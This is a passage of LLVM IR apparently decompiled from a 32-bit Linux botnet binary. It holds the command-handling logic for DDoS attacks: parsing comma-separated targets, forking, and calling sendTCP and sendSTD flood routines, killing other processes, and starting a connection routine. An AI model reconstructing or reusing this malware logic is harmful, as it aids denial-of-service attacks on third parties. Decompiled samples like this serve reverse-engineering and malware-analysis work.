  store i1 %v5_804c8c1, i1* %cf.global-to-local, align 1
  %v1_804c8c4 = inttoptr i32 %v1_804c8c1 to i32*
  %v2_804c8c4 = load i32, i32* %v1_804c8c4, align 4
  %v1_804c8c9 = call i32 @atol(i32 %v2_804c8c4)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804c8ce = icmp slt i32 %v1_804c8c9, 0
  br i1 %v2_804c8ce, label %dec_label_pc_804cd02, label %dec_label_pc_804c8d6

dec_label_pc_804c8d6:                             ; preds = %dec_label_pc_804c8b8, %dec_label_pc_804c8be
  %v8_804c8d6 = icmp ult i32 %arg1, 8
  store i1 %v8_804c8d6, i1* %cf.global-to-local, align 1
  %v12_804c8d6 = icmp eq i32 %arg1, 8
  %v1_804c8da = icmp eq i1 %v12_804c8d6, false
  br i1 %v1_804c8da, label %dec_label_pc_804c8f5, label %dec_label_pc_804c8dc

dec_label_pc_804c8dc:                             ; preds = %dec_label_pc_804c8d6
  %v1_804c8df = add i32 %tmp119, 28
  %v5_804c8df = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804c8df, i1* %cf.global-to-local, align 1
  %v1_804c8e2 = inttoptr i32 %v1_804c8df to i32*
  %v2_804c8e2 = load i32, i32* %v1_804c8e2, align 4
  %v1_804c8e7 = call i32 @atol(i32 %v2_804c8e2)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp131 = icmp slt i32 %v1_804c8e7, 1
  %tmp132 = icmp eq i1 %tmp131, false
  br i1 %tmp132, label %dec_label_pc_804c8f5, label %dec_label_pc_804cd02

dec_label_pc_804c8f5:                             ; preds = %dec_label_pc_804c8dc, %dec_label_pc_804c8d6
  %v1_804c8f8 = add i32 %tmp119, 4
  %v1_804c8fb = inttoptr i32 %v1_804c8f8 to i32*
  %v2_804c8fb = load i32, i32* %v1_804c8fb, align 4
  store i1 %v5_804c870, i1* %cf.global-to-local, align 1
  %v2_804c906 = load i32, i32* %v1_804c873, align 4
  %v1_804c90b = call i32 @atol(i32 %v2_804c906)
  store i1 %v5_804c857, i1* %cf.global-to-local, align 1
  %v2_804c919 = load i32, i32* %v1_804c85a, align 4
  %v1_804c91e = call i32 @atol(i32 %v2_804c919)
  store i1 %v2_804c889, i1* %cf.global-to-local, align 1
  %v2_804c92c = load i32, i32* %v1_804c88c, align 4
  %v1_804c931 = call i32 @atol(i32 %v2_804c92c)
  %v1_804c93c = add i32 %tmp119, 20
  %v1_804c93f = inttoptr i32 %v1_804c93c to i32*
  %v2_804c93f = load i32, i32* %v1_804c93f, align 4
  store i1 %v8_804c8d6, i1* %cf.global-to-local, align 1
  br i1 %v1_804c8da, label %dec_label_pc_804c96c, label %dec_label_pc_804c94a

dec_label_pc_804c94a:                             ; preds = %dec_label_pc_804c8f5
  %v1_804c94d = add i32 %tmp119, 28
  %v5_804c94d = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804c94d, i1* %cf.global-to-local, align 1
  %v1_804c950 = inttoptr i32 %v1_804c94d to i32*
  %v2_804c950 = load i32, i32* %v1_804c950, align 4
  %v1_804c955 = call i32 @atol(i32 %v2_804c950)
  br label %dec_label_pc_804c96c

dec_label_pc_804c96c:                             ; preds = %dec_label_pc_804c8f5, %dec_label_pc_804c94a
  %storemerge5 = phi i32 [ %v1_804c955, %dec_label_pc_804c94a ], [ 10, %dec_label_pc_804c8f5 ]
  store i32 %storemerge5, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804c8bc, label %dec_label_pc_804c97b, label %dec_label_pc_804c99d

dec_label_pc_804c97b:                             ; preds = %dec_label_pc_804c96c
  %v1_804c97e = add i32 %tmp119, 24
  %v5_804c97e = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c97e, i1* %cf.global-to-local, align 1
  %v1_804c981 = inttoptr i32 %v1_804c97e to i32*
  %v2_804c981 = load i32, i32* %v1_804c981, align 4
  %v1_804c986 = call i32 @atol(i32 %v2_804c981)
  br label %dec_label_pc_804c99d

dec_label_pc_804c99d:                             ; preds = %dec_label_pc_804c96c, %dec_label_pc_804c97b
  %storemerge4 = phi i32 [ %v1_804c986, %dec_label_pc_804c97b ], [ 0, %dec_label_pc_804c96c ]
  store i32 %storemerge4, i32* @edi, align 4
  %v2_804c9b4 = inttoptr i32 %v2_804c8fb to i8*
  %v3_804c9b4 = call i32 @__GI_strchr(i8* %v2_804c9b4, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c9b9 = icmp eq i32 %v3_804c9b4, 0
  br i1 %v1_804c9b9, label %dec_label_pc_804ca42, label %dec_label_pc_804c9c1

dec_label_pc_804c9c1:                             ; preds = %dec_label_pc_804c99d
  store i32 %v2_804c8fb, i32* @eax, align 4
  %v2_804c9cf = call i32 @__GI_strtok(i32 %v2_804c8fb, i32 ptrtoint (i32* @global_var_8055ff4.102 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ca3a25 = icmp eq i32 %v2_804c9cf, 0
  %v1_804ca3e32 = icmp eq i1 %v4_804ca3a25, false
  br i1 %v1_804ca3e32, label %dec_label_pc_804c9d9, label %dec_label_pc_804ca8c

dec_label_pc_804c9d9:                             ; preds = %dec_label_pc_804c9c1, %dec_label_pc_804ca23
  %storemerge1033 = phi i32 [ %v2_804ca32, %dec_label_pc_804ca23 ], [ %v2_804c9cf, %dec_label_pc_804c9c1 ]
  %v0_804c9d9 = call i32 @listFork()
  store i32 %v0_804c9d9, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c9de = icmp eq i32 %v0_804c9d9, 0
  %v1_804c9e0 = icmp eq i1 %v1_804c9de, false
  br i1 %v1_804c9e0, label %dec_label_pc_804ca23, label %dec_label_pc_804c9e2

dec_label_pc_804c9e2:                             ; preds = %dec_label_pc_804c9d9
  %v7_804ca12 = inttoptr i32 %v2_804c93f to i8*
  %v8_804ca12 = call i32 @sendTCP(i32 %storemerge1033, i32 %v1_804c90b, i32 %v1_804c91e, i32 %v1_804c931, i8* %v7_804ca12, i32 %storemerge4, i32 %storemerge5)
  %v1_804ca1e = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ca23:                             ; preds = %dec_label_pc_804c9d9
  %v2_804ca32 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8055ff4.102 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ca3a = icmp eq i32 %v2_804ca32, 0
  %v1_804ca3e = icmp eq i1 %v4_804ca3a, false
  br i1 %v1_804ca3e, label %dec_label_pc_804c9d9, label %dec_label_pc_804ca8c

dec_label_pc_804ca42:                             ; preds = %dec_label_pc_804c99d
  %v0_804ca42 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ca47 = icmp eq i32 %v0_804ca42, 0
  %v1_804ca49 = icmp eq i1 %v1_804ca47, false
  br i1 %v1_804ca49, label %dec_label_pc_804ca8c, label %dec_label_pc_804ca4b

dec_label_pc_804ca4b:                             ; preds = %dec_label_pc_804ca42
  %v7_804ca7b = inttoptr i32 %v2_804c93f to i8*
  %v8_804ca7b = call i32 @sendTCP(i32 %v2_804c8fb, i32 %v1_804c90b, i32 %v1_804c91e, i32 %v1_804c931, i8* %v7_804ca7b, i32 %storemerge4, i32 %storemerge5)
  %v1_804ca87 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ca8c:                             ; preds = %dec_label_pc_804ca23, %dec_label_pc_804c9c1, %dec_label_pc_804ca42, %dec_label_pc_804c7ff
  %v2_804ca8f = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804caac = inttoptr i32 %v2_804ca8f to i8*
  store i32 %v2_804ca8f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056052.117 to i32), i32* @edi, align 4
  %v7_804cabe = call i32 @_strncmp(i8* %v4_804caac, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056052.117, i32 0, i32 0), i32 4)
  %v8_804cabe = urem i32 %v7_804cabe, 2
  %v9_804cabe = icmp eq i32 %v8_804cabe, 0
  %v0_804cac0 = load i1, i1* %cf.global-to-local, align 1
  %v2_804cac0 = or i1 %v0_804cac0, %v9_804cabe
  %v3_804cac0 = zext i1 %v2_804cac0 to i32
  %v4_804cac0 = load i32, i32* @edx, align 4
  %v5_804cac0 = and i32 %v4_804cac0, -256
  %v6_804cac0 = or i32 %v3_804cac0, %v5_804cac0
  %v7_804cac0 = xor i32 %v6_804cac0, 1
  store i32 %v7_804cac0, i32* @edx, align 4
  %v1_804cac8 = trunc i32 %v7_804cac0 to i8
  %v3_804cac8 = zext i1 %v0_804cac0 to i8
  %v4_804cac8 = sub nsw i8 %v1_804cac8, %v3_804cac8
  %v15_804cac8 = icmp eq i8 %v4_804cac8, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cad1 = icmp eq i1 %v15_804cac8, false
  br i1 %v1_804cad1, label %dec_label_pc_804cbf1, label %dec_label_pc_804cad7

dec_label_pc_804cad7:                             ; preds = %dec_label_pc_804ca8c
  %v2_804cacc = sext i8 %v4_804cac8 to i32
  %v9_804cad7 = icmp ult i32 %arg1, 3
  store i1 %v9_804cad7, i1* %cf.global-to-local, align 1
  %v7_804cadb = icmp sgt i32 %arg1, 3
  br i1 %v7_804cadb, label %dec_label_pc_804cae1, label %dec_label_pc_804cd02

dec_label_pc_804cae1:                             ; preds = %dec_label_pc_804cad7
  %v1_804cae4 = add i32 %tmp119, 8
  %v5_804cae4 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804cae4, i1* %cf.global-to-local, align 1
  %v1_804cae7 = inttoptr i32 %v1_804cae4 to i32*
  %v2_804cae7 = load i32, i32* %v1_804cae7, align 4
  %v1_804caec = call i32 @atol(i32 %v2_804cae7)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp133 = icmp slt i32 %v1_804caec, 1
  br i1 %tmp133, label %dec_label_pc_804cd02, label %dec_label_pc_804caf9

dec_label_pc_804caf9:                             ; preds = %dec_label_pc_804cae1
  %v1_804cafc = add i32 %tmp119, 12
  %v5_804cafc = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804cafc, i1* %cf.global-to-local, align 1
  %v1_804caff = inttoptr i32 %v1_804cafc to i32*
  %v2_804caff = load i32, i32* %v1_804caff, align 4
  %v1_804cb04 = call i32 @atol(i32 %v2_804caff)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp134 = icmp slt i32 %v1_804cb04, 1
  %tmp135 = icmp eq i1 %tmp134, false
  br i1 %tmp135, label %dec_label_pc_804cb12, label %dec_label_pc_804cd02

dec_label_pc_804cb12:                             ; preds = %dec_label_pc_804caf9
  %v1_804cb15 = add i32 %tmp119, 4
  %v1_804cb18 = inttoptr i32 %v1_804cb15 to i32*
  %v2_804cb18 = load i32, i32* %v1_804cb18, align 4
  store i1 %v5_804cae4, i1* %cf.global-to-local, align 1
  %v2_804cb23 = load i32, i32* %v1_804cae7, align 4
  %v1_804cb28 = call i32 @atol(i32 %v2_804cb23)
  store i1 %v5_804cafc, i1* %cf.global-to-local, align 1
  %v2_804cb36 = load i32, i32* %v1_804caff, align 4
  %v1_804cb3b = call i32 @atol(i32 %v2_804cb36)
  %v2_804cb51 = inttoptr i32 %v2_804cb18 to i8*
  %v3_804cb51 = call i32 @__GI_strchr(i8* %v2_804cb51, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cb56 = icmp eq i32 %v3_804cb51, 0
  br i1 %v1_804cb56, label %dec_label_pc_804cbbf, label %dec_label_pc_804cb5a

dec_label_pc_804cb5a:                             ; preds = %dec_label_pc_804cb12
  store i32 %v2_804cb18, i32* @eax, align 4
  %v2_804cb68 = call i32 @__GI_strtok(i32 %v2_804cb18, i32 ptrtoint (i32* @global_var_8055ff4.102 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cbb716 = icmp eq i32 %v2_804cb68, 0
  %v1_804cbbb23 = icmp eq i1 %v4_804cbb716, false
  br i1 %v1_804cbbb23, label %dec_label_pc_804cb72, label %dec_label_pc_804cbf1

dec_label_pc_804cb72:                             ; preds = %dec_label_pc_804cb5a, %dec_label_pc_804cba0
  %storemerge1124 = phi i32 [ %v2_804cbaf, %dec_label_pc_804cba0 ], [ %v2_804cb68, %dec_label_pc_804cb5a ]
  %v0_804cb72 = call i32 @listFork()
  store i32 %v0_804cb72, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cb77 = icmp eq i32 %v0_804cb72, 0
  %v1_804cb79 = icmp eq i1 %v1_804cb77, false
  br i1 %v1_804cb79, label %dec_label_pc_804cba0, label %dec_label_pc_804cb7b

dec_label_pc_804cb7b:                             ; preds = %dec_label_pc_804cb72
  %v3_804cb8f = call i32 @sendSTD(i32 %storemerge1124, i32 %v1_804cb28, i32 %v1_804cb3b)
  %v1_804cb9b = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cba0:                             ; preds = %dec_label_pc_804cb72
  %v2_804cbaf = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8055ff4.102 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cbb7 = icmp eq i32 %v2_804cbaf, 0
  %v1_804cbbb = icmp eq i1 %v4_804cbb7, false
  br i1 %v1_804cbbb, label %dec_label_pc_804cb72, label %dec_label_pc_804cbf1

dec_label_pc_804cbbf:                             ; preds = %dec_label_pc_804cb12
  %v0_804cbbf = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cbc4 = icmp eq i32 %v0_804cbbf, 0
  %v1_804cbc6 = icmp eq i1 %v1_804cbc4, false
  br i1 %v1_804cbc6, label %dec_label_pc_804cd02, label %dec_label_pc_804cbcc

dec_label_pc_804cbcc:                             ; preds = %dec_label_pc_804cbbf
  %v3_804cbe0 = call i32 @sendSTD(i32 %v2_804cb18, i32 %v1_804cb28, i32 %v1_804cb3b)
  %v1_804cbec = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cbf1:                             ; preds = %dec_label_pc_804cba0, %dec_label_pc_804cb5a, %dec_label_pc_804ca8c
  %v2_804cbf4 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804cc11 = inttoptr i32 %v2_804cbf4 to i8*
  %v7_804cc23 = call i32 @_strncmp(i8* %v4_804cc11, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056056.118, i32 0, i32 0), i32 9)
  %v8_804cc23 = urem i32 %v7_804cc23, 2
  %v9_804cc23 = icmp eq i32 %v8_804cc23, 0
  %v0_804cc25 = load i1, i1* %cf.global-to-local, align 1
  %v2_804cc25 = or i1 %v0_804cc25, %v9_804cc23
  %v3_804cc25 = zext i1 %v2_804cc25 to i32
  %v4_804cc25 = load i32, i32* @edx, align 4
  %v5_804cc25 = and i32 %v4_804cc25, -256
  %v6_804cc25 = or i32 %v3_804cc25, %v5_804cc25
  %v7_804cc25 = xor i32 %v6_804cc25, 1
  store i32 %v7_804cc25, i32* %edx.global-to-local, align 4
  %v1_804cc2d = trunc i32 %v7_804cc25 to i8
  %v3_804cc2d = zext i1 %v0_804cc25 to i8
  %v4_804cc2d = sub nsw i8 %v1_804cc2d, %v3_804cc2d
  %v15_804cc2d = icmp eq i8 %v4_804cc2d, 0
  %v2_804cc31 = sext i8 %v4_804cc2d to i32
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cc36 = icmp eq i1 %v15_804cc2d, false
  br i1 %v1_804cc36, label %dec_label_pc_804cd02, label %dec_label_pc_804cca5

dec_label_pc_804cc4c:                             ; preds = %dec_label_pc_804cce2, %dec_label_pc_804cca5
  %v2_804cc4f = mul i32 %storemerge1, 4
  %v9_804cc4f = and i32 %storemerge1, 1073741824
  %v10_804cc4f = icmp ne i32 %v9_804cc4f, 0
  store i32 %v2_804cc4f, i32* %edx.global-to-local, align 4
  %v0_804cc54 = load i32, i32* @global_var_805e754.33, align 4
  %v2_804cc59 = add i32 %v0_804cc54, %v2_804cc4f
  %v1_804cc5c = inttoptr i32 %v2_804cc59 to i32*
  %v2_804cc5c = load i32, i32* %v1_804cc5c, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cc5e = icmp eq i32 %v2_804cc5c, 0
  br i1 %v1_804cc5e, label %dec_label_pc_804cca2, label %dec_label_pc_804cc62

dec_label_pc_804cc62:                             ; preds = %dec_label_pc_804cc4c
  store i1 %v10_804cc4f, i1* %cf.global-to-local, align 1
  store i32 %v2_804cc4f, i32* %edx.global-to-local, align 4
  %v2_804cc72 = load i32, i32* %v1_804cc5c, align 4
  store i32 %v2_804cc72, i32* @ebx, align 4
  %v0_804cc74 = call i32 @__libc_getpid()
  %v0_804cc79 = load i32, i32* @ebx, align 4
  %v7_804cc79 = icmp ult i32 %v0_804cc79, %v0_804cc74
  store i1 %v7_804cc79, i1* %cf.global-to-local, align 1
  %v12_804cc79 = icmp eq i32 %v0_804cc79, %v0_804cc74
  br i1 %v12_804cc79, label %dec_label_pc_804cca2, label %dec_label_pc_804cc7d

dec_label_pc_804cc7d:                             ; preds = %dec_label_pc_804cc62
  store i1 %v10_804cc4f, i1* %cf.global-to-local, align 1
  store i32 %v2_804cc4f, i32* %edx.global-to-local, align 4
  %v0_804cc85 = load i32, i32* @global_var_805e754.33, align 4
  %v2_804cc8a = add i32 %v0_804cc85, %v2_804cc4f
  %v1_804cc8d = inttoptr i32 %v2_804cc8a to i32*
  %v2_804cc8d = load i32, i32* %v1_804cc8d, align 4
  %v2_804cc9a = call i32 @kill(i32 %v2_804cc8d, i32 9)
  %v4_804cc9f = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804cca2

dec_label_pc_804cca2:                             ; preds = %dec_label_pc_804cc62, %dec_label_pc_804cc4c, %dec_label_pc_804cc7d
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804cc4c ], [ %stack_var_-28.1, %dec_label_pc_804cc62 ], [ %v4_804cc9f, %dec_label_pc_804cc7d ]
  %v4_804cca2 = add i32 %storemerge1, 1
  br label %dec_label_pc_804cca5

dec_label_pc_804cca5:                             ; preds = %dec_label_pc_804cbf1, %dec_label_pc_804cca2
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804cca2 ], [ 0, %dec_label_pc_804cbf1 ]
  %storemerge1 = phi i32 [ %v4_804cca2, %dec_label_pc_804cca2 ], [ 0, %dec_label_pc_804cbf1 ]
  %v0_804ccb9 = load i32, i32* @global_var_80584c8.31, align 8
  %v0_804ccbe = load i32, i32* @global_var_80584cc.32, align 4
  store i32 %v0_804ccbe, i32* %edx.global-to-local, align 4
  %v10_804ccd6 = icmp ne i32 %v0_804ccbe, 0
  store i1 %v10_804ccd6, i1* %cf.global-to-local, align 1
  br i1 %v10_804ccd6, label %dec_label_pc_804cc4c, label %dec_label_pc_804cce2

dec_label_pc_804cce2:                             ; preds = %dec_label_pc_804cca5
  %v10_804ccf6 = icmp ult i32 %storemerge1, %v0_804ccb9
  store i1 %v10_804ccf6, i1* %cf.global-to-local, align 1
  br i1 %v10_804ccf6, label %dec_label_pc_804cc4c, label %dec_label_pc_804cd02

dec_label_pc_804cd02:                             ; preds = %dec_label_pc_804c788, %dec_label_pc_804cce2, %dec_label_pc_804c71f, %dec_label_pc_804caf9, %dec_label_pc_804c8dc, %dec_label_pc_804c601, %dec_label_pc_804c3f6, %dec_label_pc_804cad7, %dec_label_pc_804c84a, %dec_label_pc_804c53e, %dec_label_pc_804c3d4, %dec_label_pc_804cbf1, %dec_label_pc_804cbbf, %dec_label_pc_804cae1, %dec_label_pc_804c8be, %dec_label_pc_804c89f, %dec_label_pc_804c886, %dec_label_pc_804c86d, %dec_label_pc_804c854, %dec_label_pc_804c7aa, %dec_label_pc_804c5e2, %dec_label_pc_804c5c7, %dec_label_pc_804c5ac, %dec_label_pc_804c593, %dec_label_pc_804c57a, %dec_label_pc_804c561, %dec_label_pc_804c548, %dec_label_pc_804c40f, %dec_label_pc_804c3de, %dec_label_pc_804c32b, %dec_label_pc_804c2b5, %entry, %dec_label_pc_804c354
  %v0_804cd0c = phi i32 [ %v1_804cb04, %dec_label_pc_804caf9 ], [ %v1_804c8e7, %dec_label_pc_804c8dc ], [ %v1_804c60c, %dec_label_pc_804c601 ], [ %v1_804c401, %dec_label_pc_804c3f6 ], [ %v2_804cacc, %dec_label_pc_804cad7 ], [ %v2_804c83f, %dec_label_pc_804c84a ], [ %v2_804c533, %dec_label_pc_804c53e ], [ %v2_804c3c9, %dec_label_pc_804c3d4 ], [ %v2_804cc31, %dec_label_pc_804cbf1 ], [ %v0_804cbbf, %dec_label_pc_804cbbf ], [ %v1_804caec, %dec_label_pc_804cae1 ], [ %v1_804c8c9, %dec_label_pc_804c8be ], [ %v1_804c8aa, %dec_label_pc_804c89f ], [ %v1_804c891, %dec_label_pc_804c886 ], [ %v1_804c878, %dec_label_pc_804c86d ], [ %v1_804c85f, %dec_label_pc_804c854 ], [ %v0_804c7aa, %dec_label_pc_804c7aa ], [ %v1_804c5ed, %dec_label_pc_804c5e2 ], [ %v1_804c5d2, %dec_label_pc_804c5c7 ], [ %v1_804c5b7, %dec_label_pc_804c5ac ], [ %v1_804c59e, %dec_label_pc_804c593 ], [ %v1_804c585, %dec_label_pc_804c57a ], [ %v1_804c56c, %dec_label_pc_804c561 ], [ %v1_804c553, %dec_label_pc_804c548 ], [ %v0_804c40f, %dec_label_pc_804c40f ], [ %v1_804c3e9, %dec_label_pc_804c3de ], [ %v0_804c32b, %dec_label_pc_804c32b ], [ 0, %dec_label_pc_804c2b5 ], [ %v2_804c215, %entry ], [ %v1_804c338, %dec_label_pc_804c354 ], [ %v2_804c72d, %dec_label_pc_804c71f ], [ %v0_804ccb9, %dec_label_pc_804cce2 ], [ %v2_804c797, %dec_label_pc_804c788 ]
  %v0_804cd02 = load i32, i32* @esp, align 4
  %v5_804cd02 = icmp ugt i32 %v0_804cd02, -301
  store i1 %v5_804cd02, i1* %cf.global-to-local, align 1
  %v2_804cd08 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cd08, i32* @ebx, align 4
  store i32 %v0_804c1cd, i32* @esi, align 4
  store i32 %v0_804c1cc, i32* @edi, align 4
  ret i32 %v0_804cd0c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_804cc4f, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804cc25, { 1, 0 }
  uselistorder i32 %v2_804cbaf, { 1, 0 }
  uselistorder i32 %v1_804cb3b, { 1, 0 }
  uselistorder i32 %v1_804cb28, { 1, 0 }
  uselistorder i32 %v2_804cb18, { 2, 1, 0, 3 }
  uselistorder i1 %v0_804cac0, { 1, 0 }
  uselistorder i32 %v2_804ca32, { 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0, 2 }
  uselistorder i32 %storemerge5, { 1, 0, 2 }
  uselistorder i32 %v2_804c93f, { 1, 0 }
  uselistorder i32 %v1_804c931, { 1, 0 }
  uselistorder i32 %v1_804c91e, { 1, 0 }
  uselistorder i32 %v1_804c90b, { 1, 0 }
  uselistorder i32 %v2_804c8fb, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804c8af, { 1, 0 }
  uselistorder i32 %v1_804c8aa, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v1_804c891, { 1, 0, 2 }
  uselistorder i32 %v1_804c878, { 1, 0, 2 }
  uselistorder i32 %v1_804c85f, { 1, 0, 2 }
  uselistorder i1 %v0_804c833, { 1, 0 }
  uselistorder i32 %v2_804c797, { 0, 2, 1 }
  uselistorder i32 %v2_804c72d, { 1, 0, 2 }
  uselistorder i32 %storemerge7, { 1, 0, 2 }
  uselistorder i32 %storemerge8137, { 1, 0 }
  uselistorder i32 %v1_804c682, { 2, 1, 0 }
  uselistorder i32 %v1_804c669, { 1, 0 }
  uselistorder i32 %v1_804c656, { 1, 0 }
  uselistorder i32 %v1_804c643, { 1, 0 }
  uselistorder i32 %v1_804c630, { 1, 0 }
  uselistorder i32 %v2_804c620, { 2, 1, 0, 3 }
  uselistorder i1 %v8_804c5fb, { 1, 0, 2 }
  uselistorder i32 %v1_804c5f2, { 1, 0 }
  uselistorder i32 %v1_804c5ed, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v1_804c5d7, { 1, 0 }
  uselistorder i32 %v1_804c5d2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v1_804c5bc, { 1, 0 }
  uselistorder i32 %v1_804c5b7, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v1_804c59e, { 1, 0, 2 }
  uselistorder i32 %v1_804c585, { 1, 0, 2 }
  uselistorder i32 %v1_804c56c, { 1, 0, 2 }
  uselistorder i32 %v1_804c553, { 1, 0, 2 }
  uselistorder i1 %v0_804c527, { 1, 0 }
  uselistorder i32 %v1_804c4af, { 1, 0 }
  uselistorder i1 %v0_804c3bd, { 1, 0 }
  uselistorder i1 %v0_804c318, { 1, 0 }
  uselistorder i1 %v0_804c2a2, { 1, 0 }
  uselistorder i1 %v0_804c254, { 1, 0 }
  uselistorder i1 %v0_804c209, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %tmp119, { 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 110, 8, 10, 9, 111, 11, 12, 13, 14, 15, 16, 17, 18, 19, 112, 20, 22, 21, 113, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 79, 47, 49, 48, 114, 50, 51, 52, 53, 54, 55, 115, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 104, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 105, 106, 107, 108, 109 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8055ff4.102 to i32), { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* inttoptr (i32 -25 to i32*), { 1, 0, 2, 3, 4 }
  uselistorder i32* %arg2, { 2, 3, 4, 5, 1, 6, 7, 0, 8, 9, 10, 11, 14, 13, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 %arg1, { 9, 16, 0, 15, 8, 7, 14, 6, 13, 2, 5, 1, 12, 4, 11, 3, 10 }
  uselistorder label %dec_label_pc_804cd02, { 1, 11, 12, 3, 13, 7, 4, 14, 15, 16, 17, 18, 8, 19, 0, 2, 5, 20, 21, 22, 23, 24, 25, 26, 9, 27, 6, 28, 10, 32, 29, 30, 31 }
  uselistorder label %dec_label_pc_804cca5, { 1, 0 }
  uselistorder label %dec_label_pc_804cca2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cb72, { 1, 0 }
  uselistorder label %dec_label_pc_804ca8c, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804c9d9, { 1, 0 }
  uselistorder label %dec_label_pc_804c99d, { 1, 0 }
  uselistorder label %dec_label_pc_804c96c, { 1, 0 }
  uselistorder label %dec_label_pc_804c8d6, { 1, 0 }
  uselistorder label %dec_label_pc_804c737, { 1, 0 }
  uselistorder label %dec_label_pc_804c6fb, { 1, 0 }
  uselistorder label %dec_label_pc_804c6ca, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c4f3, { 1, 0 }
  uselistorder label %dec_label_pc_804c2e1, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cd0d = load i32, i32* @ebp, align 4
  store i32 %v0_804cd0d, i32* %stack_var_-4, align 4
  %v4_804cd0d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cd0d, i32* @ebp, align 4
  %v2_804cd16 = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804cd32 = bitcast i32* %stack_var_-4104 to i8*
  %v4_804cd32 = call i32 @__GI_memset(i8* %v3_804cd32, i32 0, i32 4096)
  %v0_804cd37 = load i32, i32* @global_var_80584c0.18, align 64
  %v1_804cd3c = icmp eq i32 %v0_804cd37, 0
  br i1 %v1_804cd3c, label %dec_label_pc_804cd57, label %dec_label_pc_804cd40

dec_label_pc_804cd40:                             ; preds = %entry
  %v1_804cd48 = call i32 @__libc_close(i32 %v0_804cd37)
  store i32 0, i32* @global_var_80584c0.18, align 64
  br label %dec_label_pc_804cd57

dec_label_pc_804cd57:                             ; preds = %entry, %dec_label_pc_804cd40
  %v0_804cd57 = load i32, i32* @global_var_8058144.119, align 4
  %v1_804cd5c = icmp eq i32 %v0_804cd57, 0
  %v1_804cd5e = icmp eq i1 %v1_804cd5c, false
  br i1 %v1_804cd5e, label %dec_label_pc_804cd6c, label %dec_label_pc_804cd77

dec_label_pc_804cd6c:                             ; preds = %dec_label_pc_804cd57
